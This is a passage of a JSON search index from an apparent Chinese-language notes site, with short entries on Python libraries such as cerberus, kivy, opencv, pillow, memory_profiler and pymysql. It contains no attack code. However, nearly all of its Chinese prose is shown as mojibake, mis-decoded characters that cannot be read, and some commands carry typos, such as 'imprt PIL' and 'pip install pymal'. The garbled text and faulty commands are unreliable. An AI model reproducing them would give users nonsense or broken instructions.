è¿˜æ˜¯å…¬å¸æ¡†æ¶å†…éƒ¨çš„äº‹ä»¶å¾ªç¯æœ‰é—®é¢˜","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-aiohttp.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-aiohttp.html"},{"title":"alive-progress","text":"å…³äºè¿›åº¦æ¡å¯å‚è§: ProgressInPy å®‰è£…: pip install alive-progress ä¸ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/progress ç±»ä¼¼, ä¸è¿‡æ›´èŠ±å“¨: from alive_progress.styles import showtime def print_hi(): showtime()","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-alive-progress.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-alive-progress.html"},{"title":"cerberus","text":"å‰è¨€ cerberus æ˜¯ä¸€ä¸ªç”¨äºæ•°æ®è¡¨å•æ ¡éªŒçš„ä¸‰æ–¹åŒ… æ”¯æŒé€‰é¡¹ cerberusæ”¯æŒè§„åˆ™ é€‰é¡¹ type ç±»å‹, å¦‚string, int, datetime required æ˜¯å¦å¿…å¡«, True/False minlength æ•°æ®æœ€å°é•¿åº¦ maxlength æ•°æ®æœ€å¤§é•¿åº¦ regex æ•°æ®ä½¿ç”¨æ­£åˆ™è§„åˆ™æ ¡éªŒ, å¦‚ '&#94;0[0-9]{9}$' coerce æ•°æ®è½¬æ¢, å¦‚è½¬æ¢æ—¥æœŸä¸ºæŸä¸ªéœ€è¦çš„, å€¼ä¸ºå‡½æ•° allowed åˆ—è¡¨, åªèƒ½ä¸ºåˆ—è¡¨å†…æœ‰çš„å€¼ allof åˆ—è¡¨, å¤šä¸ªæ¡ä»¶çš„åˆ—è¡¨, å…¶ä¸­çš„æ¡ä»¶éƒ½éœ€è¦æ»¡è¶³ anyof åˆ—è¡¨, æ»¡è¶³ä»»ä¸€æ¡ä»¶å³å¯ noneof åˆ—è¡¨, å¤šä¸ªæ¡ä»¶çš„åˆ—è¡¨, å…¶ä¸­çš„æ¡ä»¶éƒ½ä¸éœ€è¦æ»¡è¶³ oneof æ»¡è¶³æ­¤çº¦æŸ check_with å‡½æ•°, ä½¿ç”¨å‡½æ•°æ£€æŸ¥, æ³¨æ„å‚æ•°åˆ—è¡¨ä¸º: field, value, error contains åˆ—è¡¨æˆ–è€…å­—ç¬¦ä¸², å®é™…æ•°æ®é›†éœ€åŒ…å«æ‰€æœ‰æšä¸¾ dependencies å€¼ä¸ºå¦ä¸€ä¸ªæ•°æ®åˆ—, å½“å‰åˆ—æœ‰å€¼æ—¶, å¦ä¸€ä¸ªæ•°æ®åˆ—å¿…é¡»æœ‰å€¼ empty True/False, æ˜¯å¦å…è®¸ä¸ºç©º excludes å­—ç¬¦ä¸²åˆ—è¡¨æˆ–è€…å­—ç¬¦ä¸², å®é™…å€¼å¿…ä¸åŒ…å«å…¶ä¸­ forbidden å­—ç¬¦ä¸²åˆ—è¡¨æˆ–è€…å­—ç¬¦ä¸², ç¦æ­¢å¡«å†™çš„å€¼, ä¸ä¸Šä¸€ä¸ªç±»ä¼¼ items åˆ—è¡¨, å®é™…å¡«å†™çš„å€¼éœ€ä¸æ­¤å¤„å¯¹åº”, æœ‰é¡ºåºä¹‹åˆ† keysrules å­—å…¸, å¯å¡«å†™å…¶ä»–è§„åˆ™, è§„èŒƒå®šä¹‰æ•°æ®å­—å…¸çš„é”® meta ä¸€ä¸ªæè¿°, ä¸ç”¨ä¸è§„åˆ™ min æ•°æ®æœ€å°å€¼ max æ•°æ®æœ€å¤§å€¼ nullable True/False, æ˜¯å¦å¯ä¸ºNone readonly True, æ•°æ®å­—æ®µæ˜¯å¦åªè¯» require_all æ‰€æœ‰å±æ€§éƒ½å¿…å¡« æŠ€å·§ å‚è€ƒ: Validation Rules å¦‚å®šä¹‰ä¸€ä¸ªå­—å…¸éªŒè¯å™¨: schema = { 'name': {'type': 'string', 'required': True}, 'age': {'type': 'integer', 'min': 18, 'max': 99}, 'email': {'type': 'string', 'regex': r'&#94;[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'} } ç¤ºä¾‹","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-cerberus.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-cerberus.html"},{"title":"clint","text":"è¿›åº¦æ¡åŠŸèƒ½å®ç°æ¨¡å—","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-clint.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-clint.html"},{"title":"ffmpeg-python","text":"å®‰è£…: pip install ffmpeg-python åª’ä½“æ–‡ä»¶å¤„ç†","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-ffmpeg.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-ffmpeg.html"},{"title":"jsonrpc","text":"æ³¨è§£ è¿™ç©æ„å„¿ä¸æ­¢ä¸€ä¸ª, çœ‹äº†ä¸€ä¸‹, æœ‰ jsonrpc, json-rpc, python-jsonrpc ... éƒ½è§‰å¾—åˆ«äººçš„è½®å­ä¸å¥½ç”¨è¦è‡ªå·±é€ æ˜¯å§, æ²¡æœ‰æŠ€å·§, å…¨æ˜¯æ¯’, è¿™ä¸€ç¯‡æ²¡å•¥å…·ä½“è¦å†™çš„ åŸºäºjsonçš„è·¨è¯­è¨€è¿œç¨‹è°ƒç”¨åè®®. è°ƒç”¨çš„jsonæ ¼å¼: { \"method\": \"æ–¹æ³•å\", \"params\": [\"å‚æ•°æ•°ç»„\"], \"id\": æ–¹æ³•ID } è¿”å›çš„jsonæ ¼å¼: { \"jsonrpc\": \"2.0\", \"id\": \"1234\", \"result\": null }","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-jsonRPC.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-jsonRPC.html"},{"title":"å®‰è£…kivy","text":"å®˜ç½‘å®‰è£…ä»‹ç»: https://kivy.org/doc/stable/gettingstarted/installation.html ä¸€èˆ¬éƒ½æ˜¯ç”¨çš„æ¡Œé¢ç³»ç»Ÿå¼€å‘, æ‰€ä»¥ç›´æ¥ä½¿ç”¨ pipå®‰è£…å³å¯: pip install \"kivy[full]\" kivy_examples å¯æƒœæˆ‘ç”¨æˆ‘çš„è€Macå®‰è£…å¤±è´¥äº†, base Python3.11: ... Updated /private/var/folders/4x/bpwwvvpn6d38ckdfw01fdggc0000gn/T/pip-install-nkzgam0u/kivy_f50690eb2e4f4577bf77f4119d23842a/kivy/include/config.pxi Updated build/lib.macosx-13-x86_64-cpython-311/kivy/setupconfig.py Updated /private/var/folders/4x/bpwwvvpn6d38ckdfw01fdggc0000gn/T/pip-install-nkzgam0u/kivy_f50690eb2e4f4577bf77f4119d23842a/kivy/setupconfig.py Detected compiler is unix error: command '/usr/bin/clang' failed with exit code 1 [end of output] note: This error originates from a subprocess, and is likely not a problem with pip. ERROR: Failed building wheel for kivy Failed to build kivy ERROR: Could not build wheels for kivy, which is required to install pyproject.toml-based projects æŸ¥è¯¢è¯´éœ€è¦å®‰è£…python-dev, ä½†æ˜¯Macåˆæ²¡æœ‰è¿™ç©æ„å„¿, ç„¶åå»github Kivy won't install on Python 3.11.0 ä¸Šçœ‹äº†ä¸€ä¸‹, ç›´æ¥å®‰è£…masterçš„è§£å†³: pip install \"kivy[full] @ https://github.com/kivy/kivy/archive/master.zip\"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Install-Kivy.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Install-Kivy.html"},{"title":"ä½¿ç”¨-kvè¯­è¨€","text":"å®˜ç½‘æ–‡æ¡£: https://kivy.org/doc/stable/gettingstarted/rules.html kivyè®¾è®¡çš„ç±»ä¼¼äºPythonçš„è¯­è¨€, å°†é€»è¾‘ä¸æ„å»ºåˆ†ç¦», åˆæ­¥æ„Ÿè§‰èƒ½å‡å°‘éƒ¨åˆ†å·¥ä½œé‡. åç¼€ä¸ºkv, æ–‡ä»¶åä¸ºåº”ç”¨ç¨‹åºå…¥å£ç±»åAppå‰é¢çš„å­—ç¬¦ä¸²çš„å°å†™.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Use--kv-language.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Use--kv-language.html"},{"title":"ä½¿ç”¨-å±æ€§å£°æ˜","text":"å®˜ç½‘: https://kivy.org/doc/stable/gettingstarted/properties.html kivyæä¾›äº†å±æ€§æ„é€ çš„æ–¹æ³•, æ¯”å¦‚ä¸€ä¸ªæ•°å­—: numeric_var = NumericProperty(1) ä¸»è¦ç”¨äºä¸kvæ–‡ä»¶çš„å±æ€§äº¤äº’, æœ‰ä»¥ä¸‹ä¼˜ç‚¹ æ”¯æŒå€¼çš„è‡ªåŠ¨å˜æ›´ æ ¡éªŒå€¼æ˜¯å¦ç¬¦åˆè¦æ±‚ ä¼˜åŒ–å†…å­˜ç®¡ç† è­¦å‘Š éœ€è¦åœ¨ç±»çº§åˆ«å£°æ˜, å³å£°æ˜ä¸ºç±»å˜é‡. æ”¯æŒå®šä¹‰ on_<propertyname> å®ä¾‹æ–¹æ³•æ¥è·å–å€¼å˜æ›´äº‹ä»¶. æä¾›çš„å±æ€§: NumericProperty æ•°å­— StringProperty å­—ç¬¦ä¸² ListProperty åˆ—è¡¨ ObjectProperty Pythonç±»å®ä¾‹ BooleanProperty bool BoundedNumericProperty åŒºé—´å€¼, å¦‚: number = BoundedNumericProperty(0, min=-5, max=5) è¡¨ç¤ºé»˜è®¤å€¼ä¸º0, æœ€å°ä¸º-5, æœ€å¤§ä¸º5 OptionProperty ReferenceListProperty AliasProperty DictProperty å­—å…¸ VariableListProperty ConfigParserProperty ColorProperty é¢œè‰², æ”¯æŒçš„å‚æ•°ç±»å‹: ä¸‰æˆ–å››ä¸ªfloatåœ¨0åˆ°1ä¹‹é—´çš„å€¼, é»˜è®¤ä¸º1 (1.0, 1.0, 1.0, 1.0) å­—ç¬¦ä¸²ç±»å‹çš„é¢œè‰²è¿›åˆ¶, å¦‚ #rrggbb or #rrggbbaa å­—ç¬¦ä¸²ç±»å‹é¢œè‰²å, å¦‚ red, yellow","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Use-attribute-declaration.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-kivy-Use-attribute-declaration.html"},{"title":"line_profiler","text":"æ€§èƒ½è°ƒä¼˜æ¨¡å—, æœ‰ä¸ªç±»ä¼¼çš„ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/memory_profiler å®˜ç½‘: https://pypi.org/project/line-profiler/ å®‰è£…: pip install line_profiler æ–¹æ³•1 ä½¿ç”¨ @profile è£…é¥°å™¨å: kernprof -lv script_to_profile.py è²Œä¼¼ä¹Ÿç›´æ¥å¯ä»¥ç”¨ä»£ç : from line_profiler import LineProfiler def base_func3(): for n in range(10000): print(f'å½“å‰nçš„å€¼æ˜¯ï¼š{n}') lp = LineProfiler() lp_wrap = lp(base_func3) lp_wrap() lp.print_stats()","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-line_profiler.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-line_profiler.html"},{"title":"maturin","text":"å°† Rust ä»£ç ç¼–è¯‘ä¸ºPythonåŒ… å®‰è£…: pip install maturin PythonåŒ…ç”Ÿæˆ å…ˆè¿›å…¥ é¡¹ç›®æ ¹ç›®å½• , ç„¶åæ‰§è¡Œ: maturin init ä¼šç”Ÿæˆ Cargo.toml å’Œ lib.rs ç„¶å: maturin develop å¦‚æœä¹‹å‰æ²¡é…ç½®è¿‡Rustï¼Œ å‚è€ƒ /docs/åç«¯/rust/index","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-maturin.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-maturin.html"},{"title":"memory_profiler","text":"æ€§èƒ½è°ƒä¼˜æ¨¡å—, æœ‰ä¸ªç±»ä¼¼çš„ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/line_profiler å®˜ç½‘: https://pypi.org/project/memory-profiler/ å®‰è£…: pip install memory_profiler æœ€ç®€å•çš„ä½¿ç”¨å°±æ˜¯ä½¿ç”¨è£…é¥°å™¨: from memory_profiler import profile @profile def count(): a += 1 ... è¾“å‡ºå¤´çš„å«ä¹‰: Line # Mem usage Increment Occurrences Line Contents åˆ†åˆ«ä¸º: ä»£ç æ‰€åœ¨è¡Œ; å†…å­˜æ€»å…±å ç”¨, å¢åŠ çš„å†…å­˜; è¿è¡Œæ¬¡æ•°; ä»£ç å†…å®¹ æ‰¾å†…å­˜æ³„æ¼ï¼Œç›´æ¥çœ‹Increment; å¦‚æœæƒ³æ‰¾å†…å­˜ç“¶é¢ˆï¼Œå°±çœ‹Mem usage mprofæŒ‡ä»¤ å®‰è£…æ­¤æ¨¡å—æ—¶å€™, ä¸€èˆ¬ä¼šåŒæ—¶å®‰è£…ä»¥ä¸‹mprofæŒ‡ä»¤, å¯ä»¥ç”¨æ¥ç»˜åˆ¶å†…å­˜å˜åŒ–å›¾ å…ˆæ‰§è¡Œ(app,pyå†…å…ˆè¦æœ‰@profileè£…é¥°å™¨, å¦‚ä¸Š): mprof run app.py ç„¶åä¼šç”Ÿæˆä¸€ä¸ª mprofile_xxxxxxxxxxxx.dat æ–‡ä»¶, é€šè¿‡æ­¤æ–‡ä»¶ç”»å‡ºå†…å­˜å˜åŒ–å›¾: mprof plot mprofile_xxxxxxxxxxxxxxxx.dat","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-memory_profiler.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-memory_profiler.html"},{"title":"numpy","text":"å®˜ç½‘: https://numpy.org","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-numpy.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-numpy.html"},{"title":"opencv","text":"å®‰è£…: pip install opencv-python å°è±¡é‡Œå¤šç”¨äºæ·±åº¦å­¦ä¹ ä¸‹çš„å›¾åƒå¤„ç†, ä¸€èˆ¬ä¸ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/numpy ä¸€èµ·ä½¿ç”¨ å¯¼å…¥: import cv2 opencv è·å–çš„å›¾åƒéƒ½æ˜¯ numpy çš„ ndarray å¯¹è±¡ å¯¹äºä¸€ä¸ªé•¿å®½åˆ†åˆ«ä¸ºwã€hçš„RGBå½©è‰²å›¾åƒæ¥è¯´ï¼Œå®ƒçš„æ¯ä¸ªåƒç´ å€¼æ˜¯ç”±(Bã€Gã€R)çš„ä¸€ä¸ªtupleç»„æˆï¼Œ opencv-pythonä¸­æ¯ä¸ªåƒç´ ä¸‰ä¸ªå€¼çš„é¡ºåºæ˜¯(Bã€Gã€R) è¯»å–å›¾åƒ-imread æ˜¾ç¤ºå›¾åƒ-imshow ä¾‹: img = cv2.imread('img.png') cv2.imshow('image', imutils.resize(img, 800)) if cv2.waitKey(0) == 27: cv2.destroyAllWindows() ä¿å­˜å›¾åƒ-imwrite ä¾‹: cv2.imwrite('img_1.jpg', img) # å°†å›¾åƒä¿å­˜æˆjpgæ–‡ä»¶ cv2.imwrite('img_2.png', img) # å°†å›¾åƒä¿å­˜æˆpngæ–‡ä»¶ æ”¾ç½®æ–‡å­—-putText åªèƒ½è‹±æ–‡, ä¸­æ–‡ä¼šä¹±ç , æ®è¯´ opencv5.0 ä¼šè§£å†³è¿™ä¸ªé—®é¢˜, æˆªæ­¢ç›®å‰å°šæœªå‘å¸ƒ. è½¬æ¢ä¸ºPILå¯æ·»åŠ ä¸­æ–‡: https://cloud.tencent.com/developer/article /2214890# çª—å£é”€æ¯-destroyAllWindows/destroyWindow å›¾åƒè‰²å½©ç©ºé—´å˜æ¢-cvtColor å›¾åƒå¤„ç†æ—¶, ç»å¸¸å°†å½©è‰²å›¾åƒè½¬åŒ–æˆç°åº¦å›¾åƒ, å› ä¸ºå›¾åƒé¢œè‰²ä¼šå› ä¸ºå…‰ç…§å› ç´ è€Œäº§ç”Ÿä¸åŒå˜åŒ–(å³å˜æˆä¸åŒé¢œè‰²å›¾ç‰‡). è€Œå›¾åƒç‰¹å¾æå–/è¯†åˆ«è¿‡ç¨‹ï¼Œéœ€è¦çš„æ˜¯å›¾åƒçš„æ¢¯åº¦ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯å›¾åƒçš„æœ¬è´¨å†…å®¹ï¼Œæ‰€ä»¥å»é™¤é¢œè‰²å¯¹æ¢¯åº¦å¹²æ‰°. å¯ä»¥é™ä½æ•°æ®é‡, å¢å¼ºå¤„ç†æ•ˆæœ. å›¾åƒç»˜åˆ¶ ç›´çº¿ cv2.line: ç›´çº¿-line é•¿æ–¹å½¢ cv2.rectangle: é•¿æ–¹å½¢-rectangle åœ† cv2.circle: åœ†-circle æ¤­åœ† cv2.ellipse: æ¤­åœ†-ellipse å¤šè¾¹å½¢ cv2.polylines: å¤šè¾¹å½¢-polylines å…¬å…±å‚æ•°ï¼š img: è¡¨ç¤ºéœ€è¦è¿›è¡Œç»˜åˆ¶çš„å›¾åƒå¯¹è±¡ndarray color: è¡¨ç¤ºç»˜åˆ¶å‡ ä½•å›¾å½¢çš„é¢œè‰²ï¼Œé‡‡ç”¨BGRå³ä¸Šè¿°è¯´çš„(Bã€Gã€R) thickness: è¡¨ç¤ºç»˜åˆ¶å‡ ä½•å›¾å½¢ä¸­çº¿çš„ç²—ç»†ï¼Œé»˜è®¤ä¸º1ï¼Œå¯¹äºåœ†ã€æ¤­åœ†ç­‰å°é—­å›¾åƒå–-1æ—¶æ˜¯å¡«å……å›¾å½¢å†…éƒ¨ lineType: è¡¨ç¤ºç»˜åˆ¶å‡ ä½•å›¾å½¢çº¿çš„ç±»å‹ï¼Œé»˜è®¤8-connectedçº¿æ˜¯å…‰æ»‘çš„ï¼Œå½“å–cv2.LINE_AAæ—¶çº¿å‘ˆç°é”¯é½¿çŠ¶ ç›´çº¿-line é•¿æ–¹å½¢-rectangle åœ†-circle æ¤­åœ†-ellipse å¤šè¾¹å½¢-polylines ä¾‹: pts = np.array([[10,5],[20,30],[70,20],[50,10]], np.int32) img = cv2.polylines(img,[pts],True,(0, 0, 0), 2) å¯¹å›¾åƒçš„ç®€å•åƒç´ æ“ä½œ å¯¹å›¾åƒå–å: gray_img = cv2.imread('img.jpg', 0) # åŠ è½½ç°åº¦å›¾åƒ reverse_img = 255 - gray_img å¯¹å›¾åƒåƒç´ çº¿æ€§å˜æ¢: for i in range(gray_img.shape[0]): for j in range(gray_img.shape[1]): random_img[i, j] = gray_img[i, j]*1.2","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-opencv-python.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-opencv-python.html"},{"title":"outcome","text":"æ•è·å‡½æ•°è¿è¡Œçš„ç»“æœ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-outcom.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-outcom.html"},{"title":"pandas","text":"è¯»å– CSV: read_csv()","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pandas.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pandas.html"},{"title":"pillow(PIL)","text":"å®‰è£…: pip install pillow å¯¼å…¥: imprt PIL PILï¼Œå…¨ç§° Python Imaging Library, å›¾åƒå¤„ç†åº“. PIL ä»…æ”¯æŒåˆ°Python 2.7ï¼ŒåŠ ä¸Šå¹´ä¹…å¤±ä¿®ï¼Œäºæ˜¯ä¸€ç¾¤å¿—æ„¿è€…åœ¨ PIL çš„åŸºç¡€ä¸Šåˆ›å»ºäº†å…¼å®¹ Python 3 çš„ç‰ˆæœ¬ï¼Œåå­—å« Pillow ï¼Œ å¯ä»¥é€šè¿‡å®‰è£… Pillow æ¥ä½¿ç”¨ PILã€‚ æ‰“å¼€ã€ä¿å­˜ã€æ˜¾ç¤ºå›¾ç‰‡ æ‰“å¼€ã€ä¿å­˜ã€æ˜¾ç¤ºå›¾ç‰‡: from PIL import Image image = Image.open('img.jpg') image.show() image.save('1.jpg') print(image.mode, image.size, image.format) # RGB (481, 321) JPEG mode ä¸ºå›¾ç‰‡çš„æ¨¡å¼ï¼ŒRGB ä»£è¡¨å½©è‰²å›¾åƒï¼ŒL ä»£è¡¨å…‰ç…§å›¾åƒä¹Ÿå³ç°åº¦å›¾åƒç­‰ size ä¸ºå›¾ç‰‡çš„å¤§å°(å®½åº¦ï¼Œé•¿åº¦) format ä¸ºå›¾ç‰‡çš„æ ¼å¼ï¼Œå¦‚å¸¸è§çš„ PNGã€JPEG ç­‰ è½¬æ¢å›¾ç‰‡æ¨¡å¼ è½¬æ¢å›¾ç‰‡æ¨¡å¼: image.show() grey_image = image.convert('L') grey_image.show() é€šé“åˆ†ç¦»åˆå¹¶ é€šé“åˆ†ç¦»åˆå¹¶: r, g, b = image.split() im = Image.merge('RGB', (b, g, r)) å½©è‰²å›¾åƒå¯ä»¥åˆ†ç¦»å‡º Rã€Gã€B é€šé“ï¼Œä½†è‹¥æ˜¯ç°åº¦å›¾åƒï¼Œåˆ™è¿”å›ç°åº¦å›¾åƒæœ¬èº«ã€‚ç„¶åï¼Œå¯ä»¥å°† Rã€Gã€B é€šé“æŒ‰ç…§ä¸€å®šçš„é¡ºåºå†åˆå¹¶æˆå½©è‰²å›¾åƒã€‚ å›¾ç‰‡è£å‰ªã€æ—‹è½¬å’Œæ”¹å˜å¤§å° å›¾ç‰‡è£å‰ªã€æ—‹è½¬å’Œæ”¹å˜å¤§å°: # å¯¹è§’åæ ‡, å·¦ä¸Š(x, y), å³ä¸‹(x, y) box = (100, 100, 300, 300) region = image.crop(box) # ç¿»è½¬180åº¦ region = region.transpose(Image.ROTATE_180) image.paste(region, box) image.show() æˆ–è€…: im = image.resize((300, 300)) im = image.rotate(45) # é€†æ—¶é’ˆæ—‹è½¬ 45 åº¦ im = image.transpose(Image.FLIP_LEFT_RIGHT) # å·¦å³ç¿»è½¬ im = im.transpose(Image.FLIP_TOP_BOTTOM)# ä¸Šä¸‹ç¿»è½¬ åƒç´ å€¼æ“ä½œ åƒç´ å€¼æ“ä½œ: out = image.point(lambda i: i * 1.2) # å¯¹æ¯ä¸ªåƒç´ å€¼ä¹˜ä»¥ 1.2 source = image.split() out = source[0].point(lambda i: i > 128 and 255) # å¯¹ R é€šé“è¿›è¡ŒäºŒå€¼åŒ– å’ŒNumpyæ•°ç»„ä¹‹é—´çš„è½¬åŒ– å’Œ Numpy æ•°ç»„ä¹‹é—´çš„è½¬åŒ–: array = np.array(image) print(array.shape) #(321, 481, 3) out = Image.fromarray(array) å›¾åƒç¼©æ”¾æ»¤æ³¢å™¨-Pillowåº“ åœ¨Pillowåº“ä¸­ï¼Œå¸¸ç”¨çš„å›¾åƒç¼©æ”¾æ»¤æ³¢å™¨æœ‰ä»¥ä¸‹å‡ ç§ï¼š Image.NEAREST: æœ€è¿‘é‚»æ»¤æ³¢å™¨ã€‚å®ƒé€‰æ‹©è·ç¦»ç¼©æ”¾åä½ç½®æœ€è¿‘çš„åƒç´ ä½œä¸ºæ–°åƒç´ å€¼ï¼Œç¼©æ”¾é€Ÿåº¦å¿«ä½†æ•ˆæœè¾ƒå·®ã€‚ Image.BOX: å‡å€¼æ»¤æ³¢å™¨ã€‚å®ƒè®¡ç®—åœ¨ç¼©æ”¾å‰è¦†ç›–æ¯ä¸ªè¾“å‡ºåƒç´ çš„æ‰€æœ‰è¾“å…¥åƒç´ çš„å¹³å‡å€¼ï¼Œå¹¶ä½¿ç”¨è¯¥å¹³å‡å€¼ä½œä¸ºæ–°åƒç´ å€¼ã€‚æ¯”æœ€è¿‘é‚»æ»¤æ³¢å™¨æ›´å¹³æ»‘ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´å›¾åƒå¤±çœŸã€‚ Image.BILINEAR: åŒçº¿æ€§æ»¤æ³¢å™¨ã€‚å®ƒé€šè¿‡å¯¹è·ç¦»ç¼©æ”¾åä½ç½®æœ€è¿‘çš„å››ä¸ªåƒç´ è¿›è¡ŒåŠ æƒå¹³å‡æ¥è®¡ç®—æ–°åƒç´ å€¼ã€‚æ¯”å‡å€¼æ»¤æ³¢å™¨å’Œæœ€è¿‘é‚»æ»¤æ³¢å™¨æ›´å¹³æ»‘ï¼Œä½†å¯èƒ½ä¼šä¸¢å¤±ä¸€äº›ç»†èŠ‚ã€‚ Image.HAMMING: æ±‰æ˜çª—å£å‡½æ•°æ»¤æ³¢å™¨ã€‚å®ƒå°†è¾“å…¥åƒç´ ä¸ä¸€ä¸ªæ±‰æ˜çª—å£å‡½æ•°è¿›è¡Œå·ç§¯ï¼Œä»¥å¹³æ»‘å›¾åƒå¹¶å‡å°‘é”¯é½¿çŠ¶å¤±çœŸã€‚å…·æœ‰è¾ƒé«˜çš„è®¡ç®—å¤æ‚æ€§ï¼Œä½†æ•ˆæœå¾ˆå¥½ã€‚ Image.BICUBIC: åŒä¸‰æ¬¡æ’å€¼æ»¤æ³¢å™¨ã€‚å®ƒé€šè¿‡åœ¨è·ç¦»ç¼©æ”¾åä½ç½®æœ€è¿‘çš„16ä¸ªåƒç´ ä¸Šåº”ç”¨åŒä¸‰æ¬¡æ’å€¼æ¥è®¡ç®—æ–°åƒç´ å€¼ã€‚æ¯”åŒçº¿æ€§æ»¤æ³¢å™¨æ›´å¹³æ»‘ï¼Œä½†å¯èƒ½ä¼šä¸¢å¤±ä¸€äº›ç»†èŠ‚ã€‚ Image.LANCZOS: å…°ç´¢æ–¯æ»¤æ³¢å™¨ã€‚å®ƒé€šè¿‡åœ¨è·ç¦»ç¼©æ”¾åä½ç½®æœ€è¿‘çš„è‹¥å¹²ä¸ªåƒç´ ä¸Šåº”ç”¨ä¸€ä¸ªåŸºäºå…°ç´¢æ–¯å‡½æ•°çš„å·ç§¯æ ¸æ¥è®¡ç®—æ–°åƒç´ å€¼ã€‚å®ƒæä¾›äº†æœ€é«˜çš„è´¨é‡ï¼Œä½†è®¡ç®—å¤æ‚åº¦ä¹Ÿæœ€é«˜ã€‚ æ¯ç§æ»¤æ³¢å™¨éƒ½æœ‰å…¶é€‚ç”¨çš„åœºæ™¯å’Œä¼˜ç¼ºç‚¹ã€‚ é€šå¸¸ï¼Œå¦‚æœéœ€è¦å¿«é€Ÿå¤„ç†å¤§é‡å›¾åƒï¼Œåˆ™å¯ä»¥ä½¿ç”¨Image.NEARESTæˆ–Image.BOXæ»¤æ³¢å™¨ã€‚ å¦‚æœéœ€è¦å‡å°‘é”¯é½¿çŠ¶å¤±çœŸå¹¶ä¿ç•™æ›´å¤šçš„ç»†èŠ‚ï¼Œåˆ™å¯ä»¥ä½¿ç”¨Image.BILINEARæˆ–Image.BICUBICæ»¤æ³¢å™¨ã€‚ å¦‚æœæ‚¨éœ€è¦æœ€é«˜è´¨é‡çš„ç¼©æ”¾ï¼Œä¾‹å¦‚ç”¨äºæ‘„å½±æˆ–å°åˆ·å“ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨Image.LANCZOSæ»¤æ³¢å™¨ï¼Œä½†éœ€è¦æ³¨æ„å®ƒçš„è®¡ç®—å¤æ‚åº¦è¾ƒé«˜ã€‚ ps: ç°åœ¨é«˜ç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯ Image.Resampling.xxx , å¦‚ç¼©æ”¾æ—¶ä½¿ç”¨ LANCZOS æ»¤æ³¢å™¨: with Image.open(img_file) as im: # è®¡ç®—ç¼©æ”¾åçš„å›¾ç‰‡å¤§å° # im.convert('RGB') width, height = im.size new_width, new_height = int(width * scale), int(height * scale) size = (new_width, new_height) # ç¼©æ”¾å›¾åƒ resized_im = im.resize(size, resample=Image.Resampling.LANCZOS)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pillow.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pillow.html"},{"title":"playwright","text":"ä¸ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/selenium/index ç±»ä¼¼ ä¸€ä¸ªè¾ƒæ–°çš„è‡ªåŠ¨åŒ–æµ‹è¯•æ¡†æ¶.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-playwright.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-playwright.html"},{"title":"pyaml","text":"æä¾›å¯¹ yaml æ ¼å¼æ–‡ä»¶çš„æ“ä½œ, ç±»ä¼¼ json å®‰è£…: pip install pymal","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyaml.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyaml.html"},{"title":"pymysql","text":"å®‰è£…: pip install pymysql æä¾›æ•°æ®åº“æ“ä½œ: import pymysql db = pymysql.connect( host='127.0.0.1', user='user', password='password', database='database' ) cur = db.cursor() try: cur.execute('show tables;') result = cur.fetchone() print(result) cur.execute('select user();') result = cur.fetchone() print(result) db.commit() except Exception as e: db.rollback() finally: db.close()","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pymysql.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pymysql.html"},{"title":"pySerial","text":"ä¸ä¸²å£è®¾å¤‡é€šä¿¡çš„åŒ…. 